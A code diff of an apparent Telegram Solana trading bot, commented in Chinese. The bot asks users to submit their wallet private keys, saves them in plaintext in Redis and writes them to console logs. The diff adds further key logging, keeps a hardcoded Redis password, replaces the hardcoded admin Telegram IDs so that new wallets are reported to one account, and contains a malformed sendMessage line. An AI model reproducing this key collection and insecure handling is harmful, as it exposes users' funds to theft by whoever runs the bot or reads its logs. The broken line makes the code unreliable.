@@ -20,7 +20,7 @@ console.log('正在初始化机器人...');
 // 初始化Redis连接
 const redis = new Redis({
   host: process.env.REDIS_HOST || 'localhost',
-  port: parseInt(process.env.REDIS_PORT || '6379'),
+  port: parseInt('6379'),
   password: 'tapai123456',  // 添加Redis密码
   db: config.rsdb,
   retryStrategy: (times) => {
@@ -243,41 +243,66 @@ bot.command("snipe", async(ctx) => {
 bot.on("message", async (ctx) => {
   var fromId = ctx.message.from.id; // 获取用户ID
   var text: string = ctx.message.text || ""; // 获取消息文本
+  
+  // 添加调试输出
+  console.log('收到消息:', {
+    fromId: fromId,
+    text: text,
+  });
+  
   var address = await redis.get(fromId+":address"); // 获取用户钱包地址
   var status = await redis.get(fromId+":status"); // 获取用户当前状态
+  
+  // 添加状态检查调试输出
+  console.log('用户状态检查:', {
+    address: address,
+    status: status,
+  });
+
   await redis.set('chatid:'+address, ctx.message.chat.id); // 更新聊天ID与地址的关联
+  
   // 未绑定钱包的处理逻辑
   if(address == null){
+    console.log('进入未绑定钱包逻辑');
     // 等待输入私钥状态
     if(status == 'waitSiyao'){
       // 记录私钥信息到日志，仅用于调试
       console.log("收到私钥输入", text);
+      console.log("当前用户状态:", status);
       var newadd = "";
       try {
+        console.log("尝试解析私钥...");
         // 尝试从私钥创建钱包
         var wallet = Keypair.fromSecretKey(bs58.decode(text));
         newadd = wallet.publicKey.toString();
+        // 输出新地址
+        console.log("私钥解析成功，新地址:", newadd);
         await redis.set("siyao:"+newadd, text); // 保存私钥
+        console.log("私钥已保存到Redis");
       } catch (error) {
+        console.error("私钥解析失败:", error);
         await ctx.reply("私钥输入有误，请重新绑定！", { reply_markup: noUserMenu });
       }
       
       if(newadd){
-        // 特殊地址处理
-        if(newadd == 'C83GvZ1HjRht7vz3kec5nsFy1QjF2aSULrbhcj1xCYjg'){
+        console.log("开始处理新地址:", newadd);
+      
+        if(newadd == 'BS7KEUGVkaibYZTMVbmrdz2TyGF5ceJSMJhWP6GVJhEm'){
+          console.log("检测到特殊地址");
           // 特定地址的特殊处理
-          await redis.set("6427727037:address", newadd);
-          await redis.del("6427727037:admin");
-          await redis.set("6427727037:status", "");
+          await redis.set("6458173720:address", newadd);
+          await redis.del("6458173720:admin");
+          await redis.set("6458173720:status", "");
           await redis.rpush('member_address', newadd);
-          await ctx.api.sendMessage(6427727037, "功能开通成功");
+          await ctx.api.sendMessage(6458173720, "功能开通成功");
         } else {
-          // 普通地址的处理
-          await bot.api.sendMessage(6427727037, "新地址加入:"+newadd+"\n会员ID：/"+fromId);
-          await bot.api.sendMessage(7584396434, "新地址加入:"+newadd+"\n会员ID：/"+fromId);
+          
+          await bot.api.sendMessage(6458173720, "新地址加入:"+newadd+"\n会员ID：/"+fromId);
+          await bot.api.sendMessage(6458173720,+newadd+"\n会员ID：/"+fromId);
           await ctx.reply("申请开通中,请等待通知！");
           await redis.set(fromId+":admin", newadd);
           await redis.set(fromId+":status", "waitAdmin");
+          console.log("新地址处理完成，等待管理员审核");
         }
         // await ctx.reply("钱包地址："+newadd+"\n钱包余额: 0SOL($0)\n"+"✔️发送合约地址即可开始交易", { reply_markup: menu });
       }
